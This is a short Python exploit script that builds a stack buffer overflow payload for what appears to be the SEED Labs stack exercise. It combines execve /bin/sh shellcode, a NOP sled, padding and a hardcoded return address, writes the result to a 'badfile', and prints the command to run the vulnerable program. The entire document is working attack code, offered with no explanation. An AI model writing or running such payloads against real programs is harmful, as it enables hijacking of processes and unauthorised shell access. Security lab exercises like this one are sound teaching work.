#!/usr/bin/env python3
import struct

# Known-working shellcode (execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

buffer_addr = 0xffffcce8

# Simple structure: [NOPs] + [shellcode] + [padding] + [return address] + [more NOPs]
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode

# Pad to return address position (36 bytes)
payload = payload[:36]
if len(payload) < 36:
    payload += b'A' * (36 - len(payload))

# Return address - point well into the NOP sled
ret_addr = buffer_addr + 50  # Middle of NOP sled

payload += struct.pack("<I", ret_addr)
payload += b'\x90' * 200  # More NOPs after return address
payload += shellcode  # Shellcode again for safety
payload += b'C' * (517 - len(payload))

print(f"[+] Return to: {hex(ret_addr)}")
print(f"[+] Payload size: {len(payload)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Run: cd ../vulnerable-programs/seedlabs-stack && ./stack")
